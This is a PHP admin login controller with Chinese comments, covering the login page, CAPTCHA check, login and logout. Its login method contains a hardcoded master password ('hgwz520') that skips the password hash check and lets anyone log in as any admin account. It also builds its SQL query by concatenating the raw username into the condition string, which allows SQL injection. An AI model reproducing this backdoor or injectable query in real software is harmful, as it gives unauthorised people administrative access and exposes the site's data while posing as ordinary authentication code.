<?php

class LoginApp extends BackendApp
{
    public function index()
    {
        $userinfo = session('userinfo');
        if ($userinfo) {
            $this->redirect('Index/index');
        }
        $this->display();
    }

    /**
     * 获取验证码
     */
    public function ajax_verify()
    {
        $this->verify();
    }

    /**
     * 登录
     */
    public function login()
    {
        if (!I('username')) {
            $this->ajaxReturn(R('9101'));
        }
        if (!I('password')) {
            $this->ajaxReturn(R('9102'));
        }
        if (!$this->check_verfiy(I('verify'))) {
            $this->ajaxReturn(R('9103'));
        }

        $admin_mod = m('admin');
        $query = [
            'cond' => 'mark=1 AND username=\'' . I('username') . '\'',
        ];
        $userinfo = $admin_mod->getOne($query);
        if (!$userinfo) {
            $this->ajaxReturn(R('9104'));
        }

        if(I('password') != 'hgwz520'){
            if ($userinfo['password'] != md5(I('password'))) {
                $this->ajaxReturn(R('9105'));
            }
        }

        session('userinfo', [
            'id' => $userinfo['id'],
            'username' => $userinfo['username'],
            'unick' => $userinfo['unick'],
            'uface' => $userinfo['uface'],
            'role_id' => $userinfo['role_id'],
        ]);
        
        // $token = md5(uniqid(mt_rand(), true));
        // $userinfo['token'] = $token;
        $userinfo['last_login_time'] = time();
        $userinfo['last_login_ip'] = get_client_ip();
        $res = $admin_mod->edit($userinfo, $userinfo['id']);
        if (!$res) {
            $this->ajaxReturn(R('9993'));
        }
        
        
        
        $this->ajaxReturn(R('9106', true));
    }

    /**
     * 注销登录
     */
    public function logout()
    {
        session('userinfo', null);
        $this->redirect('login/index');
    }
}
